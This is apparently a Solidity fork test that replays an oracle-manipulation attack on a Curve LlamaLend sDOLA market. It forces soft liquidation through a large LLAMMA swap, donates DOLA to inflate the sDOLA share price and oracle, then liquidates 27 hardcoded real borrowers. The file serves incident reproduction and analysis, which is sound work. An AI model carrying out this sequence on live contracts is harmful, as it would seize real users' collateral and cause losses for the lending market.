// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface VmCurveSdola {
    function createSelectFork(string calldata url, uint256 blockNumber) external returns (uint256);
    function envOr(string calldata name, uint256 defaultValue) external returns (uint256);
    function load(address target, bytes32 slot) external view returns (bytes32);
    function store(address target, bytes32 slot, bytes32 value) external;
}

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC4626Like is IERC20Like {
    function convertToAssets(uint256 shares) external view returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IDolaSavings {
    function stake(uint256 amount, address recipient) external;
}

interface ILlamaLendOracle {
    function price() external view returns (uint256);
}

interface ILLAMMA {
    function exchange(uint256 i, uint256 j, uint256 inAmount, uint256 minAmount, address receiver)
        external
        returns (uint256[2] memory);
}

interface ILlamaLendController {
    function debt(address user) external view returns (uint256);
    function health(address user, bool full) external view returns (int256);
    function liquidate(address user, uint256 minX) external;
    function tokens_to_liquidate(address user) external view returns (uint256);
}

contract CurveSdolaLlamaLendAttackReplayTest {
    VmCurveSdola private constant vm =
        VmCurveSdola(address(uint160(uint256(keccak256("hevm cheat code")))));

    uint256 private constant WAD = 1e18;
    uint256 private constant DEFAULT_FORK_BLOCK = 24_566_936;
    uint256 private constant LLAMMA_CRVUSD_IN = 13_250_000 * WAD;
    uint256 private constant DOLA_DONATION = 190_777 * WAD;
    uint256 private constant LIQUIDATION_FUNDING = 12_000_000 * WAD;

    address private constant CONTROLLER = 0xaD444663c6C92B497225c6cE65feE2E7F78BFb86;
    address private constant LLAMMA = 0x0079885E248B572CdC4559A8B156745e2d8EA1f7;
    address private constant ORACLE = 0x88822eE517Bfe9A1b97bf200b0b6D3F356488fF2;
    address private constant SDOLA = 0xb45ad160634c528Cc3D2926d9807104FA3157305;
    address private constant DOLA_SAVINGS = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
    address private constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address private constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;

    address[27] private borrowers = [
        0x2b083a0aA6B808A31e9Ac749772a285F5CD34FBe,
        0xcBcC2b2eCD195eBEF03Fcb7c7564e4E906485A14,
        0xba5Aa2A3dbbBB4c7C3A8950Fc6251bB8020cf844,
        0x145e305A6E8979CbEfCb75993f7aE5270856c1d2,
        0xF60De76791c2F09995df52Aa1c6e2E7DcF1E75d7,
        0xe9c0DF9BD4607850d410C957FeC11eC209De5Ef6,
        0x8db98764ada29B55a23F7A8cb07Be6F74F0D0e75,
        0xc6c77B16A85C3946e0BDfC71fdb7eFD3d89359d0,
        0x5B860E2D38f723d5370cF21f82d6aDAd31EF0B7D,
        0xb152FC7E9ddf01A942685E390A74009cd2B9Ca52,
        0xE170ED9D77792397271d564c7161351d69fe9300,
        0x8fc5777D607171B42a61FED4c74242E54677903F,
        0x80C67fe70d7D6cC488782439fad381d8646640c4,
        0x9BF8Af305152FAdDd81c70f8599148e9FC6EFA20,
        0x21Ab0875611da0235BC5b6405b8A08268D859700,
        0x6Ce50491FAA9FaC1Dc883A2769Ab129E75eB0A75,
        0xc69F65D2720DF32c244163E0F608284415aAEF4B,
        0x6dB248100cF4908429AB671F33D105311ED7fEF8,
        0xC8233a46F57Add754f32Cf9e25A85aAe8a7D5f29,
        0xC8801FFAaA9DfCce7299e7B4Eb616741EA01F5DE,
        0x57F845829140D9d9D8e357fA0D9f943483a12FC5,
        0xD4FFcD8b6B7Ec90f4EAC001125f4A7B21DC0f781,
        0x3e258AAe11D7eA394b2eb1176CcD54D9EB83861b,
        0x6EF36f7130D00addF40Ce9b040DA0bc02491D2e1,
        0x2D57740EE18594bCbfa845703FaD49882e1567d9,
        0xaDBAfAE28C3041ECb74456cd7fB9097bD1287308,
        0x8467241838Bc761D9Ef4F8ae6790Ede292fbA2F9
    ];

    error AssertionFailed(string reason);
    error NoSdolaAcquired();
    error NoLiquidatableBorrowers(int256 minHealthAfterDonation);
    error NoSuccessfulLiquidations(uint256 negativeHealthCount);
    error BalanceSlotNotFound(address token, address account);

    function test_oraclePpsDonationRaisesPrice() external {
        _forkBeforeAttack();

        uint256 ppsBefore = IERC4626Like(SDOLA).convertToAssets(WAD);
        uint256 oracleBefore = ILlamaLendOracle(ORACLE).price();

        _donateDolaToSdola(DOLA_DONATION);

        uint256 ppsAfter = IERC4626Like(SDOLA).convertToAssets(WAD);
        uint256 oracleAfter = ILlamaLendOracle(ORACLE).price();

        _assertGt(ppsAfter, ppsBefore, "sDOLA PPS did not increase");
        _assertGt(oracleAfter, oracleBefore, "LlamaLend oracle did not increase");
    }

    function test_softLiquidationPlusPpsJumpMakesBorrowersLiquidatable() external {
        _forkBeforeAttack();

        HealthSummary memory beforeState = _summarizeHealth();
        _assertEq(beforeState.negativeCount, 0, "borrower was liquidatable before replay");

        uint256 ppsBefore = IERC4626Like(SDOLA).convertToAssets(WAD);
        uint256 oracleBefore = ILlamaLendOracle(ORACLE).price();

        _forceSoftLiquidation();
        _redeemAcquiredSdola();
        _donateDolaToSdola(DOLA_DONATION);

        uint256 ppsAfter = IERC4626Like(SDOLA).convertToAssets(WAD);
        uint256 oracleAfter = ILlamaLendOracle(ORACLE).price();
        HealthSummary memory afterDonation = _summarizeHealth();

        _assertGt(ppsAfter, ppsBefore, "sDOLA PPS did not increase after replay");
        _assertGt(oracleAfter, oracleBefore, "oracle did not increase after replay");

        if (afterDonation.negativeCount == 0) {
            revert NoLiquidatableBorrowers(afterDonation.minHealth);
        }

        uint256 successes = _liquidateNegativeHealthBorrowers();
        if (successes == 0) {
            revert NoSuccessfulLiquidations(afterDonation.negativeCount);
        }
    }

    struct HealthSummary {
        uint256 negativeCount;
        int256 minHealth;
        int256 maxHealth;
    }

    function _forkBeforeAttack() private {
        uint256 forkBlock = vm.envOr("CURVE_SDOLA_FORK_BLOCK", DEFAULT_FORK_BLOCK);
        vm.createSelectFork("mainnet", forkBlock);
    }

    function _forceSoftLiquidation() private {
        _setTokenBalance(CRVUSD, address(this), LLAMMA_CRVUSD_IN);
        IERC20Like(CRVUSD).approve(LLAMMA, type(uint256).max);

        uint256 sdolaBefore = IERC20Like(SDOLA).balanceOf(address(this));
        ILLAMMA(LLAMMA).exchange(0, 1, LLAMMA_CRVUSD_IN, 0, address(this));
        uint256 sdolaAfter = IERC20Like(SDOLA).balanceOf(address(this));

        _assertGt(sdolaAfter, sdolaBefore, "LLAMMA exchange did not acquire sDOLA");
    }

    function _redeemAcquiredSdola() private {
        uint256 shares = IERC20Like(SDOLA).balanceOf(address(this));
        if (shares == 0) revert NoSdolaAcquired();

        IERC20Like(SDOLA).approve(SDOLA, shares);
        IERC4626Like(SDOLA).redeem(shares, address(this), address(this));
    }

    function _donateDolaToSdola(uint256 amount) private {
        uint256 current = IERC20Like(DOLA).balanceOf(address(this));
        if (current < amount) {
            _setTokenBalance(DOLA, address(this), amount);
        }
        IERC20Like(DOLA).approve(DOLA_SAVINGS, amount);
        IDolaSavings(DOLA_SAVINGS).stake(amount, SDOLA);
    }

    function _summarizeHealth() private view returns (HealthSummary memory summary) {
        summary.minHealth = type(int256).max;
        summary.maxHealth = type(int256).min;

        ILlamaLendController controller = ILlamaLendController(CONTROLLER);
        for (uint256 i = 0; i < borrowers.length; i++) {
            int256 health = controller.health(borrowers[i], false);
            if (health < 0) summary.negativeCount++;
            if (health < summary.minHealth) summary.minHealth = health;
            if (health > summary.maxHealth) summary.maxHealth = health;
        }
    }

    function _liquidateNegativeHealthBorrowers() private returns (uint256 successes) {
        _setTokenBalance(CRVUSD, address(this), LIQUIDATION_FUNDING);
        IERC20Like(CRVUSD).approve(CONTROLLER, type(uint256).max);

        ILlamaLendController controller = ILlamaLendController(CONTROLLER);
        for (uint256 i = 0; i < borrowers.length; i++) {
            if (controller.health(borrowers[i], false) >= 0) continue;

            try controller.liquidate(borrowers[i], 0) {
                successes++;
            } catch {}
        }
    }

    function _assertEq(uint256 actual, uint256 expected, string memory reason) private pure {
        if (actual != expected) revert AssertionFailed(reason);
    }

    function _assertGt(uint256 actual, uint256 expected, string memory reason) private pure {
        if (actual <= expected) revert AssertionFailed(reason);
    }

    function _setTokenBalance(address token, address account, uint256 amount) private {
        for (uint256 slot = 0; slot < 32; slot++) {
            if (_trySetTokenBalanceSlot(token, account, amount, _balanceSlotSolidity(account, slot))) {
                return;
            }
            if (_trySetTokenBalanceSlot(token, account, amount, _balanceSlotVyper(account, slot))) {
                return;
            }
        }

        revert BalanceSlotNotFound(token, account);
    }

    function _trySetTokenBalanceSlot(address token, address account, uint256 amount, bytes32 slot)
        private
        returns (bool)
    {
        bytes32 previous = vm.load(token, slot);
        vm.store(token, slot, bytes32(amount));
        if (IERC20Like(token).balanceOf(account) == amount) {
            return true;
        }
        vm.store(token, slot, previous);
        return false;
    }

    function _balanceSlotSolidity(address account, uint256 slot) private pure returns (bytes32) {
        return keccak256(abi.encode(account, slot));
    }

    function _balanceSlotVyper(address account, uint256 slot) private pure returns (bytes32) {
        return keccak256(abi.encode(slot, account));
    }
}
